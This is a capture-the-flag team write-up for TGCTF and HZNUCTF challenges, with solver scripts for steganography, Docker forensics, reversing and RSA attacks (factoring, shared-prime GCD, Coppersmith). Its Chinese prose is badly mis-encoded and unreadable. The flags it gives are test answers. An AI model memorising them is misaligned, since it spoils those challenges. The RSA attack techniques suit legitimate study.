# Misc

## è¿™æ˜¯å•¥o\_o | struck - Yolo

æ‰ç“¶é¢ˆäº†ï¼Œé¦–å…ˆæŠŠgifç»™åˆ†ç¦»å‡ºæ¥ï¼Œå‘ç°æœ€åå‡ å¼ ç…§ç‰‡å·¦ä¸Šè§’æœ‰æ®‹ç¼ºäºŒç»´ç ï¼ŒæŠŠä»–ä»¬ä¿®å¤å¥½åï¼Œå¾—åˆ°ä¸€å¼ æ±‰ä¿¡ç ï¼Œä½†æ˜¯è§£å¯†åå¹¶ä¸æ˜¯flag



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918528.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918529.png)

time is your fortune ,efficiency is your life

## Next is the end | FINISHED - Yolo

è¿™ç±»åµŒå¥—æ–‡ä»¶å¤¹çš„é—®é¢˜ï¼Œå¤„ç†å¾ˆç®€å•ï¼Œåœ¨ç»ˆç«¯ä½¿ç”¨dir -Rå°±èƒ½å‘ç°æˆ‘ä»¬è¦çš„æ–‡ä»¶è·¯å¾„

è¿˜æœ‰ä¸ªè¶…çº§ç®€å•çš„æ–¹æ³•ï¼Œå°±æ˜¯ç”¨vscodeæ‰“å¼€å°±è¡Œï¼Œå°±åƒè¿™æ ·

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918530.png)

## where it is(osint) | Solved - Seandictionary,Yolo

yoloä¸æƒ³æå›¾å¯»ï¼Œç­‰Seanå›æ¥äº†å¸®å¿™å¼„ä¸€ä¸‹

![](<https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918531.png>)

è¦æ±‚æ˜¯æ‰¾åˆ°å³ä¸Šè§’çš„ç«™ç‚¹å

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918532.png)



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918533.png)

æˆªå›¾å…³é”®éƒ¨åˆ†ç”¨è°·æ­Œè¯†å›¾æœç´¢å¾—åˆ°å°åŒ—æ¸¯å¢˜åœ°é“ç«™



è§£å†³äº†ï¼Œæ˜¯TGCTF{æ¸¯å¢˜ç«™}

## å°é¾™

ç”¨zstegåªèƒ½æ‰¾åˆ°ååŠéƒ¨åˆ†çš„flag

\_Clever\_guys}

## ä½ çš„è¿æ°”æ˜¯å¥½æ˜¯åï¼Ÿ| FINISHED - Spreng

```plain&#x20;text
å¥½é‹ä¾† ç¥ä½ å¥½é‹ä¾† å¥½é‹å¸¶ä¾†äº†å–œå’Œæ„› å¥½é‹ä¾† æˆ‘å€‘å¥½é‹ä¾† è¿è‘—å¥½é‹èˆˆæ—ºç™¼é”é€šå››æµ· ç–Šå€‹åƒç´™é¶´ å†ç³»å€‹ç´…é£„å¸¶ é¡˜å–„è‰¯çš„äººå€‘å¤©å¤©å¥½é‹ä¾† ä½ å‹¤å‹ç”Ÿæ´»ç¾ ä½ å¥åº·æ˜¥å¸¸åœ¨ ä½ ä¸€ç”Ÿçš„å¿™ç¢Œç‚ºäº†ç¬‘é€é¡é–‹ æ‰“å€‹ä¸­åœ‹çµ è«‹æ˜¥é¢¨å‰ªå€‹å½© é¡˜ç¥–åœ‹çš„æ—¥æœˆå¹´å¹´å¥½é‹ä¾† ä½ é³³èˆå¤ªå¹³å¹´ ä½ é¾é¨°æ–°æ™‚ä»£ ä½ å¹¸ç¦çš„å®¶åœ’è¿ä¾†ç™¾èŠ±ç››é–‹ å¥½é‹ä¾† ç¥ä½ å¥½é‹ä¾† å¥½é‹å¸¶ä¾†äº†å–œå’Œæ„› å¥½é‹ä¾† æˆ‘å€‘å¥½é‹ä¾† è¿è‘—å¥½é‹èˆˆæ—ºç™¼é”é€šå››æµ· ç–Šå€‹åƒç´™é¶´ å†ç³»å€‹ç´…é£„å¸¶ é¡˜å–„è‰¯çš„äººå€‘å¤©å¤©å¥½é‹ä¾† ä½ å‹¤å‹ç”Ÿæ´»ç¾ ä½ å¥åº·æ˜¥å¸¸åœ¨ ä½ ä¸€ç”Ÿçš„å¿™ç¢Œç‚ºäº†ç¬‘é€é¡é–‹ æ‰“å€‹ä¸­åœ‹çµ è«‹æ˜¥é¢¨å‰ªå€‹å½© é¡˜ç¥–åœ‹çš„æ—¥æœˆå¹´å¹´å¥½é‹ä¾† ä½ é³³èˆå¤ªå¹³å¹´ ä½ é¾é¨°æ–°æ™‚ä»£ ä½ å¹¸ç¦çš„å®¶åœ’è¿ä¾†ç™¾èŠ±ç››é–‹ å¥½é‹ä¾† ç¥ä½ å¥½é‹ä¾† å¥½é‹å¸¶ä¾†äº†å–œå’Œæ„› å¥½é‹ä¾† æˆ‘å€‘å¥½é‹ä¾† è¿è‘—å¥½é‹èˆˆæ—ºç™¼é”é€šå››æµ· å¥½é‹ä¾† ç¥ä½ å¥½é‹ä¾† å¥½é‹å¸¶ä¾†äº†å–œå’Œæ„› å¥½é‹ä¾† æˆ‘å€‘å¥½é‹ä¾† è¿è‘—å¥½é‹èˆˆæ—ºç™¼é”é€šå››æµ· å¥½é‹ä¾† ç¥ä½ å¥½é‹ä¾† å¥½é‹å¸¶ä¾†äº†å–œå’Œæ„› å¥½é‹ä¾† æˆ‘å€‘å¥½é‹ä¾† è¿è‘—å¥½é‹èˆˆæ—ºç™¼é”é€šå››æµ· é€šå››æµ· å¥½é‹ä¾† 
```

flagä¸ºTGCTF{1\~99999999ä¸­çš„æŸä¸€ä¸ªæ•°å­—}

å…­ç™¾å…­åå…­ï¼Œéƒ½ä¸å¸¦ç›äº†ã€‚çº¯ç‹—è¿å•Šï¼Œæˆ‘æœ¬æ¥çŒœæµ‹æ˜¯ä½œè€…æˆ–è€…æ­Œæ›²æ—¥æœŸçš„ï¼Œå‘ç°éƒ½ä¸å¯¹ï¼Œéšæ‰‹å¡«äº†ä¸€ä¸ª114514ã€‚

TGCTF{114514}

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918534.png)

## TeamGipsy\&ctfer | FINISHED - Yolo

è¿™ç§å–è¯ç¬¬ä¸€æ¬¡è§ï¼ŒæŒºæœ‰æ„æ€çš„

é¦–å…ˆè™šæ‹Ÿæœºæˆ‘æ˜¯å¯ä»¥ä»¿çœŸæŒ‚è½½ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç ç™»å½•ä¸è¿›å»ï¼Œç„¶åä½¿ç”¨Diskgeniusç›´æ¥çœ‹æ–‡ä»¶ç›®å½•ï¼Œè¿™é‡Œå‘ç°æ¡Œé¢æœ‰ä¸ªmimi.txtï¼ŒæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå‘ç°å¾ˆç®€å•ï¼Œæ‹‰ä¸ªdockerï¼Œé‡Œé¢å¼„äº†äº›å’Œmysqlæœ‰å…³çš„æ“ä½œ

```sql
    1  passwd hznuctfer
    2  reboot
    3  pass
    4  passwd hznuctfer
    5  reboot
    6  sudo apt update
    7  sudo apt install docker.io
    8  clear
    9  docker -v
   10  docker run -d --name TeamGipsyctf1 -e MYSQL_ROOT_PASSWORD=password_is_me mysql
   11  docker exec -it TeamGipsy1 bash
   12  docker exec -it TeamGipsyctf1 bash
   13  docker run -d --name TeamGipsyctf2 -e MYSQL_ROOT_PASSWORD=password_is_me mysql
   14  docker exec -it TeamGipsy2 bash
   15  docker exec -it TeamGipsyctf2 bash
   16  docker -l
   17  docker ps
   18  docker stop TeamGipsyctf1
   19  docker stop TeamGipsyctf2
   20  docker ps
   21  exit
   22  history
   23  history > mimi.txt

```

ç„¶åå‘¢ï¼Œæˆ‘å°±æŠŠå’Œdockerç›¸å…³çš„æ–‡ä»¶å¤¹å¯¼å‡ºï¼Œçœ‹è¿™ä¸ªé•œåƒé‡Œé¢æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œè¿™é‡Œé‡åˆ°äº†ç‚¹æ³¢æŠ˜ï¼Œdgæ²¡æœ‰ç ´è§£çš„è¯ï¼Œèƒ½æ¢å¤çš„æ–‡ä»¶æœ‰å¤§å°é™åˆ¶ï¼Œæˆ‘æ²¡å»æ‰¾ç½‘ä¸Šçš„ç ´è§£ç‰ˆæœ¬ï¼Œç›´æ¥ç”¨7zæ¢å¤äº†ï¼Œç„¶åæŸ¥çœ‹äº†ä¸‹æ–‡ä»¶ç›®å½•

å¯¹äº†ï¼Œéœ€è¦æ¢å¤çš„dockeræ–‡ä»¶åœ¨/var/lib/docker/

```typescript
yolo@Yolo:~/Desktop$ cd docker
yolo@Yolo:~/Desktop/docker$ ls
buildkit  containers  engine-id  image  network  overlay2
yolo@Yolo:~/Desktop/docker$ ls -l
total 24
drwxr-xr-x  4 yolo yolo 4096 Apr 12 16:31 buildkit
drwxr-xr-x  4 yolo yolo 4096 Apr 12 16:31 containers
-rw-r--r--  1 yolo yolo   36 Mar 15  2024 engine-id
drwxr-xr-x  3 yolo yolo 4096 Apr 12 16:31 image
drwxr-xr-x  3 yolo yolo 4096 Apr 12 16:31 network
drwxr-xr-x 16 yolo yolo 4096 Apr 12 16:32 overlay2
yolo@Yolo:~/Desktop/docker$ ls
buildkit  containers  engine-id  image  network  overlay2  plugins  runtimes  swarm  tmp  volumes
```

ç„¶åè¿™é‡Œæˆ‘æ‹·æ‰“aiï¼Œå®Œæˆäº†åç»­çš„æ“ä½œï¼Œä»¥ä¸‹æ˜¯å‘½ä»¤æ±‡æ€»

```plain&#x20;text
sudo docker pull mysql:8.3.0
sudo docker pull mysql:5.7
sudo chown -R 999:999 ~/Desktop/docker/volumes/1c2724ccd3605664703d5c139c2b1c92198dc449fe2a9de7ffc015ceb11f9327/_data/
sudo chown -R 999:999 ~/Desktop/docker/volumes/1783d31445c82f27a817f947a32249bd2f15738dbb9906685aea05a339df20ba/_data/
sudo docker run -d --name TeamGipsyctf2 -v ~/Desktop/docker/volumes/1783d31445c82f27
a817f947a32249bd2f15738dbb9906685aea05a339df20ba/_data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=password_is_me mysq
l:8.3.0
sudo docker run -d --name TeamGipsyctf1 -v ~/Desktop/docker/volumes/1c2724ccd3605664703d5c139c2b1c92198dc449fe2a9de7ffc015ceb11f9327/_data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=password_is_me mysql:8.3.0
sudo docker exec -it TeamGipsyctf2 bash
mysql -u root -ppassword_is_me
SHOW DATABASES;     è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªTeamGispyï¼Œå…¶å®è¿™ä¸œè¥¿æˆ‘åœ¨å¯¼å‡ºæ–‡ä»¶çš„æ—¶å€™å°±é‡åˆ°äº†ï¼Œä¸‹é¢æœ‰CTF.ibdå’ŒTG.ibd
USE TeamGispy;
SHOW TABLES;
SELECT * FROM CTF;  å‘ç°é‡Œé¢å•¥ä¹Ÿæ²¡æœ‰
SELECT * FROM TG;   è¿™é‡Œæœ‰æˆ‘è¦çš„flag
```

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918535.png)

`HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}`

ç”¨zstegå¾—åˆ°äº†è§£å‹å¯†ç "key=i\_1ove\_y0u"







![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918536.png)

é€šè¿‡æ£€æŸ¥pngchunkï¼Œå‘ç°æœ€åé™„åŠ äº†ä¸²å­—ç¬¦ï¼Œè¿›è¡Œè§£ç ï¼Œå¾—åˆ°ä¿¡æ¯

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918537.png)

å¾ˆä¸å–œæ¬¢è¿™ç§æ–‡é‚¹é‚¹çš„è¯å•Šï¼Œè¯´çš„å•¥æ„æ€ï¼Œéš¾é“æ˜¯æœ‰ç›²æ°´å°ï¼Ÿ



# Reverse

## Base64 | FINISHED - Spreng

æ¸…æ™°çš„é€»è¾‘ï¼Œé­”æ”¹Base64

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918538.png)

é­”æ”¹äº†ä½çš„åˆ†é…å’Œbasetableï¼Œç„¶åå–basetableæ—¶è¿˜ç§»ä½24äº†ï¼Œæ‰€ä»¥è§£å¯†æ—¶å¯¹basetableå…ˆç§»ä½24ä½

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918539.png)

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define _BYTE unsigned char

void base64decode(_BYTE *C, int len, _BYTE *P)
{
    int v3;
    __int64 v5;
    char v6;
    int i, j;
    unsigned char block[4];
    // unsigned char basetable[65] = "GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI";
    unsigned char basetable[65] = "53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebIGLp/+Wn7uqX8FQ2JDR1c0M6U";

    for (i = 0; 4 * i < len; ++i)
    {
        block[3] = 0;
        block[2] = 0;
        block[1] = 0;
        block[0] = 0;
        for (j = 0; j < 4; ++j)
        {
            if (C[j + 4 * i] == '=')
                break;
            else
                block[j] = strchr(basetable, C[j + 4 * i]) - (int)basetable;
        }
        P[3 * i] = ((block[0] << 2) | (block[1] >> 4)) & 0xFF;
        P[3 * i + 1] = ((block[1] << 4) | (block[2] >> 2)) & 0xFF;
        P[3 * i + 2] = ((block[2] << 6) | block[3]) & 0xFF;
    }
}

int main()
{
    _BYTE C[] = "AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=";
    _BYTE P[100];
    base64decode(C, strlen(C), P);
    printf("%s\n", P);
    // HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}
    return 0;
}
```

## æ°´æœå¿è€… | FINISHED - Spreng

dnspyåç¼–è¯‘

```python
GameManager.encryptionKey = "HZNUHZNUHZNUHZNU";
GameManager.iv = "0202005503081501";
GameManager.encryptedHexData = "cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf";
```

AESè§£å¯†ï¼šHZNUCTF{de20-70dd-4e62-b8d0-06e}

ä¸‹æ¬¡è¯•è¯•ç›´æ¥ä¿®æ”¹ä»£ç ã€‚

## è›‡å¹´çš„æœ¬å‘½è¯­è¨€ | FINISHED - Spreng

ç®€å•pythonåç¼–è¯‘ï¼Œç¬¬ä¸€éƒ¨åˆ†çš„å­—ç¬¦å­—ç¬¦ä¸²ï¼šflagä¸­çš„å­—ç¬¦æ›¿æ¢ä¸ºé¢‘ç‡ï¼Œç¬¬äºŒéƒ¨åˆ†å°†flagçš„å­—ç¬¦å˜æˆå­—ç¬¦+é¢‘ç‡çš„å½¢å¼ï¼Œå°†è¿™ä¸ªæ–°çš„å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦çš„ascllç æ„å»ºæ–¹ç¨‹ç»„

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918540.png)

sympyè§£æ–¹ç¨‹ç»„ï¼Œç”±äºå˜é‡åçš„æ’åºä¼šå‡ºç°é”™æ’å¦‚0ï¼Œ1ï¼Œ10ï¼Œ11...ï¼Œéœ€è¦æ‰‹å·¥è°ƒä¸€ä¸‹ã€‚

ç„¶åç”¨ç¬¬ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ï¼Œé¢‘ç‡æ¢å›åŸæ¥çš„å­—ç¬¦å³å¯

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918541.png)

## XTEA | FINISHED - Spreng

4å­—èŠ‚é€†åºï¼ŒxteaåŠ å¯†ï¼Œkeyç”¨éšæœºæ•°å–çš„ï¼Œä½†ç§å­å·²ç»ç»™äº†ã€‚

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918542.png)

å¯æ¶ï¼Œæˆ‘çœ‹è¿™ä¸ªcipheræ˜¯è¾“å…¥çš„ï¼Œä»¥ä¸ºæ˜¯çˆ†ç ´é¢˜ï¼Œçˆ†ç ´å®Œå‘ç°å°±æ˜¯å¸¸è§„å€¼ï¼Œæ°”æ­»å•¦ã€‚

```c++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#define _BYTE unsigned char
#define _DWORD unsigned int

unsigned int *__fastcall xtea_decrypt(int a1, unsigned int *a2, unsigned int *a3, __int64 a4)
{
    unsigned int *result; // rax
    unsigned int v5;      // [rsp+24h] [rbp+4h]
    unsigned int v6;      // [rsp+44h] [rbp+24h]
    unsigned int v7;      // [rsp+64h] [rbp+44h]
    int i;                // [rsp+84h] [rbp+64h]

    v5 = *a2;
    v6 = *a3;
    v7 = -a1 * 32;
    for (i = 0; i < 32; ++i)
    {
        // printf("%d %d %d\n", v5, v6, v7);
        v6 -= (*(_DWORD *)(a4 + 4LL * ((v7 >> 11) & 3)) + v7) ^ (v5 + ((v5 >> 5) ^ (16 * v5)));
        v7 += a1;
        v5 -= (*(_DWORD *)(a4 + 4LL * (v7 & 3)) + v7) ^ (v6 + ((v6 >> 5) ^ (16 * v6)));
    }

    *a2 = v5;
    result = a3;
    *a3 = v6;
    return result;
}

int main()
{
    int i;
    _DWORD key[4];
    unsigned int delta;
    _BYTE enc_flag[] = {
        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,
        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,
        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,
        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17};
    _BYTE flag[33];
    _DWORD v10[15];
    srand(0x7E8u);
    for (i = 0; i < 4; ++i)
        key[i] = rand();

    // test();

    for (delta = 0x9e3779b9; delta < 0xFFFFFFFF; delta++)
    {

        strcpy(flag, enc_flag);
        flag[32] = 0;

        for (i = 6; i >= 0; --i)
        {
            xtea_decrypt(delta, &flag[4 * i], &flag[4 * i + 4], key);
            if (i == 6 && flag[28] != '}')
                break;
        }

        if (!strncmp(flag, "UNZH", 3))
        {
            printf("%s %x\n", flag, delta);
            break;
        }

        if (delta % 0x1000000 == 0)
            printf("%x\n", delta);
    }

    // UNZH{FTC-6ea75f97b4-4b-49-32}be8

    for (int j = 0; j < 32; j += 4)
    {

        v10[j / 4] = *((char *)flag + j + 3) | (*((char *)flag + j + 2) << 8) | (*((char *)flag + j + 1) << 16) | (*((char *)flag + j) << 24);
    }
    for (i = 0; i < 7; ++i)
    {
        *(_DWORD *)(flag + 4 * i) = v10[i];
    }
    *(_DWORD *)(flag + 28) = v10[7];

    printf("%s\n", flag);
    // HZNUCTF{ae6-9f57-4b74-b423-98eb}

    return 0;
}
```

HZNUCTF{ae6-9f57-4b74-b423-98eb}



# Crypto

## è´¹å…‹ç‰¹å°” | FINISHED - Spreng

åˆ†è§£è´¨å› æ•°

```plain&#x20;text
from Crypto.Util.number import *
import math

c = 670610235999012099846283721569059674725712804950807955010725968103642359765806
n = 810544624661213367964996895060815354972889892659483948276203088055391907479553
e = 65537

# Sat Apr 12 10:35:44 2025  p3 factor: 113
# Sat Apr 12 10:35:44 2025  p5 factor: 18251
# Sat Apr 12 10:35:44 2025  p7 factor: 2001511
# Sat Apr 12 10:35:44 2025  p27 factor: 214168842768662180574654641
# Sat Apr 12 10:35:44 2025  p39 factor: 916848439436544911290378588839845528581
p = [
    113,
    18251,
    2001511,
    214168842768662180574654641,
    916848439436544911290378588839845528581,
]
phi = math.prod([i - 1 for i in p])

d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
# b'TGCTF{f4888_6abdc_9c2bd_9036bb}'

```

## å®å®rsa | FINISHED - SeanDictionary

```python
from Crypto.Util.number import *
import gmpy2

p1 = 8362851990079664018649774360159786938757293294328116561219351503022492961843907118845919317399785168488103775809531198339213009936918460080250107807031483
q1 = 8312546034426788223492083178829355192676175323324230533451989649056072814335528263136523605276378801682321623998646291206494179416941978672637426346496531
c1 = 39711973075443303473292859404026809299317446021917391206568511014894789946819103680496756934914058521250438186214943037578346772475409633145435232816799913236259074769958139045997486622505579239448395807857034154142067866860431132262060279168752474990452298895511880964765819538256786616223902867436130100322

n2 = 103873139604388138367962901582343595570773101048733694603978570485894317088745160532049473181477976966240986994452119002966492405873949673076731730953232584747066494028393377311943117296014622567610739232596396108513639030323602579269952539931712136467116373246367352649143304819856986264023237676167338361059
c2 = 51380982170049779703682835988073709896409264083198805522051459033730166821511419536113492522308604225188048202917930917221
e2 = 3

n1 = p1*q1
phi = (p1-1)*(q1-1)

for e1 in range(2**17, 2**18):
    if gcd(e1, phi) != 1:
        continue
    try:
        d1 = inverse(e1, phi)
        m1 = pow(c1, d1, n1)
        flag1 = long_to_bytes(int(m1)).decode()
    except:
        continue

while True:
    a,b = gmpy2.iroot(c2,e2)
    if b:
        flag2 = long_to_bytes(int(a)).decode()
        break
    c2 += n2

print(flag1+flag2)

# TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}
```

##

## AAAAAAAAÂ·çœŸÂ·ç­¾åˆ° | FINISHED - Spreng

æ³¨æ„åˆ°UGBRC{RI0G!O04\_5C3\_OVUI\_DV\_MNTB}çš„UGBRCå’ŒTGCTFçš„å·®å€¼åˆ†åˆ«æ˜¯-1ï¼Œ0ï¼Œ1ï¼Œ2ï¼Œ3

æ•…è®¤ä¸ºç§»ä½shiftä¸ºi-1

```python

text = "UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}"
result = ""
for i in range(len(text)):
    char = text[i]
    shift = i - 1
    # å¤„ç†å¤§å†™å­—æ¯
    if char.isupper():
        shifted = (ord(char) - ord("A") + shift) % 26
        result += chr(shifted + ord("A"))
    # å¤„ç†å°å†™å­—æ¯
    elif char.islower():
        shifted = (ord(char) - ord("a") + shift) % 26
        result += chr(shifted + ord("a"))
    # éå­—æ¯å­—ç¬¦ä¿æŒä¸å˜
    else:
        result += char
print(result)

```

## mmä¸èº²çŒ«çŒ« | FINISHED - Spreng

å…ˆä»ä¼—å¤šnä¸­ä¸¤ä¸¤å–GCDï¼Œåˆ©ç”¨æ‰¾å‡ºçš„ç´ æ•°è¿›è¡Œåˆ†è§£nã€‚

```go
p = set()

for i in range(len(n)):
    for j in range(i + 1, len(n)):
        if GCD(n[i], n[j]) != 1:
            # print(f"n[{i}] = {n[i]}, n[{j}] = {n[j]}")
            # print(f"c[{i}] = {c[i]}, c[{j}] = {c[j]}")
            # print(f"GCD(n[{i}], n[{j}]) = {GCD(n[i], n[j])}")
            p.add(GCD(n[i], n[j]))
print(p)
```

è¿™é‡Œçš„n\[0]çš„ç´ å› æ•°è¢«æ‰¾åˆ°äº†ã€‚

```python
p = 8966982846196321583218732818156212338929358106653027903288099594075033180211918114777730737751247653195936571427074856051307498770294940971178276714212171

q = n[0] // p
print(isPrime(p))
print(isPrime(q))

phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c[0], d, n[0])
print(long_to_bytes(m))
# b'TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}'
```

åˆ†äº«ä¸€ç‚¹æ­£åˆ™è¡¨è¾¾å¼çš„æŠ€å·§ï¼Œåƒä»–ç»™çš„æ–‡ä»¶ä¸èƒ½ç›´æ¥æ”¾è¿›pythonä¸­ç”¨ï¼Œä¸€ä¸ªä¸€ä¸ªæ”¹åˆå¾ˆéº»çƒ¦ï¼Œå°±å¯ä»¥ç”¨ctrl+Hå¯ç”¨æ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢ï¼Œç„¶åå†å¾®è°ƒä¸€ä¸‹ã€‚

```python
# "\[n_(\d+)\]" -> ""
# "\n\n\nn = " -> ")\n\nn.append("
# "\nc = " -> ")\nc.append("
```

## tRwSiAns\_ | FINISHED - Spreng

ç”¨ä¸€ä¸‹ç«‹æ–¹å·®å…¬å¼ï¼Œå‡‘å·®å€¼

```python
c1 = pow(m + hash(307), 3, n)
c2 = pow(m + hash(7), 3, n)

c1 = m1^3
c2 = m2^3
c1 - c2 = (m1-m2)*(())
```

```python
# from flag import FLAG
from Crypto.Util.number import *
import hashlib
import gmpy2

def hash(x):
    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)

n = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839
e = 3
c1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366
c2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814

d = hash(307) - hash(7) % n
x = (
    (pow(c1 - c2, 1, n) * pow(d, -1, n) - pow(d, 2, n)) * inverse(3, n) + pow(d, 2, n)
) % n

print(gmpy2.iroot(x, 2))
m = gmpy2.iroot(x, 2)[0] - (hash(307) + hash(7)) // 2
print(long_to_bytes(m))
# b'TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}'

```



## LLLCG

æ„Ÿè§‰æ˜¯DSAæ¢å¤ç„¶åæ¢å¤LCG

## EZRSA | FINISHED - Spreng

è§£é‡Šä¸€ä¸‹emojiç´ æ•°çš„ç”Ÿæˆï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç´ æ•°æ€»ä½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨getPrimeç”Ÿæˆçš„ä½æ•°ï¼Œä¾‹å¦‚è¿™ä¸ªpå°±æ˜¯é«˜224ä½ç”¨getPrimeï¼Œå‰©ä¸‹çš„ç”¨emojiï¼Œqå°±æ˜¯å…¨ç”¨emojiã€‚

ä¸€ä¸ªemojiæœ‰32ä½ï¼Œæ‰€ä»¥på°±æ˜¯getPrime(224)<<224+9ä¸ªemojiï¼Œqåˆ™æ˜¯16ä¸ªemojiã€‚

é¢˜ç›®ç»™å‡ºäº†pä½ä½ï¼ˆ8ä¸ªemojiï¼‰ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘coppersmithæ”»å‡»ã€‚ï¼ˆå…¶å®æˆ‘æ„Ÿè§‰qå…¨éƒ½æ˜¯emojiä¹Ÿæœ‰å¼±ç‚¹ï¼Œå¯èƒ½æœ‰éé¢„æœŸè§£ï¼‰

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918543.png)

ç”¨è¿™ä¸ªè„šæœ¬æµ‹è¯•ä¸€ä¸‹å‘ç°8ä¸ªemojiç®—ä¸å‡ºæ¥ï¼Œ9ä¸ªemojiå°±å¯ä»¥ã€‚

```python
from Crypto.Util.number import getPrime
p = getPrime(int(512))
q = getPrime(int(512))
n = p * q
test_bits = 224
p_h = p >> test_bits
R.<x> = PolynomialRing(Zmod(n))
f = (p_h << test_bits) + x
f.small_roots(2**test_bits,0.4)
```

å› ä¸ºemojièŒƒå›´æ˜¯u1F601 - u1F64Fï¼Œä¸éš¾çˆ†ç ´ã€‚

```python
from Crypto.Util.number import *

n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401

bit = 288

for code_point in range(0x1F600, 0x1F64F + 1):
    emoji = chr(code_point)
    p0 = emoji + "ğŸ˜˜ğŸ˜¾ğŸ˜‚ğŸ˜‹ğŸ˜¶ğŸ˜¾ğŸ˜³ğŸ˜·"
    low_p = bytes_to_long(p0.encode())

    R.<x> = PolynomialRing(Zmod(n), implementation='NTL')
    f = x * 2^bit + low_p
    roots = f.monic().small_roots(X=2^224, beta=0.4)

    if roots:
        print("Found: ")
        p = int(roots[0] * 2^bit + low_p)
        q = n // p
        assert p * q == n
        print(f"p = {p}")
        print(f"q = {q}")
        break
else:
    print("Fail")
    
'''
Found: 
p = 12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311
q = 12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989
'''
```

ç„¶åå‘ç°eä¸phiä¸äº’ç´ ï¼Œä½†å…¬å› æ•°ä¸å¤§ï¼Œåˆ†åˆ«æ˜¯3å’Œ5ï¼Œå…ˆåˆ†å¼€å„è‡ªæ±‚è§£mï¼Œå†ç”¨CRTæ–¹æ³•åˆå¹¶ã€‚

```python
from Crypto.Util.number import *
import gmpy2

def part_roots(n, c, e, p):
    # å°†eçº¦ç®€åˆ°å¯é€†ï¼Œgä¸ºä½™ä¸‹çš„å› æ•°
    def div_e(e, p):
        g = GCD(e, (p - 1))
        while GCD(e, (p - 1)) != 1:
            e //= GCD(e, (p - 1))
            g *= GCD(e, (p - 1))
        return e, g
    
    # çº¦ç®€eï¼Œä¾¿äºå¼€æ ¹
    e, g = div_e(e, p)
    d = inverse(e, p - 1)
    M = pow(c, d, p)
    
    # åœ¨æœ‰é™åŸŸå†…å¼€æ ¹
    R.<x> = Zmod(p)[]
    f = x ^ g - M
    return [int(i[0]) for i in f.monic().roots()]

